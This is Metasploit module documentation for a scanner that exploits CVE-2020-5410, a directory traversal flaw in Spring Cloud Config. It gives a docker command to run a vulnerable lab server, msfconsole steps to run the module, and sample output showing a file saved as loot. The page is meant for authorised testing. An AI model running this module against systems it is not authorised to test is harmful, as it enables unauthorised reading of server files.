## Vulnerable Application

This module exploits an unauthenticated directory traversal vulnerability which exists in Spring Cloud Config versions 2.2.x prior to 2.2.3 and 2.1.x prior to 2.1.9, and older unsupported versions. Spring Cloud Config listens by default on port 8888.

**References:** https://tanzu.vmware.com/security/cve-2020-5410 <br>
**Vulnerable Installation Guide:** https://github.com/osamahamad/CVE-2020-5410-POC/blob/master/README.md

```
docker run -it --name=spring-cloud-config-server \
-p 8888:8888 \
hyness/spring-cloud-config-server:2.1.6.RELEASE \
--spring.cloud.config.server.git.uri=https://github.com/spring-cloud-samples/config-repo
```

## Verification Steps

1. `./msfconsole`
2. `use auxiliary/scanner/http/springcloud_directory_traversal`
3. `set rhosts <rhost>`
4. `run`

## Scenarios

### Tested against Linux zero 4.15.0-48-generic #51-Ubuntu SMP x86_64 GNU/Linux

```
msf5 auxiliary(scanner/http/springcloud_directory_traversal) > run

[+] File saved in: /Users/Dhiraj/.msf4/loot/20200619234552_default_[REDACTED]_springcloud.trav_785232.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/http/springcloud_directory_traversal) > 
```
